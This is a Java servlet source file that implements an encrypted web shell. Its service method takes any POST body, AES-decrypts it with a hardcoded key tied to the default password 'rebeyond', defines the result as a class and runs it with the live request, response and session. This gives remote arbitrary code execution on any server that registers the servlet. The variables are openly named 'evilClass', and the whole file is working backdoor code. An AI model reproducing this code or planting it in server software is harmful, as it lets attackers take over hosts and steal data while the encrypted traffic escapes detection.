package com.sorry.bug; /**
 * created by 0x22cb7139 on 2021/6/17
 */

import javax.servlet.*;
import javax.servlet.http.*;
import java.io.IOException;

public class CustomServlet implements Servlet {
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
    @Override
    public void init(ServletConfig servletConfig) throws ServletException {
        System.out.println("servlet创建");
    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        HttpServletResponse rsp = (HttpServletResponse) servletResponse;
        try {
            if (req.getMethod().equals("POST")) {
                String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                req.getSession().setAttribute("u", k);
                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
                java.util.Map<String, Object> pageContext = new java.util.HashMap<String, Object>();
                pageContext.put("session", req.getSession());
                pageContext.put("request", req);
                pageContext.put("response", rsp);
                java.io.BufferedReader bf = req.getReader();
                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(bf.readLine()));
                String sb = new String(evilClassBytes);
                Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
                Object a = evilClass.newInstance();
                a.equals(pageContext);
                return;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
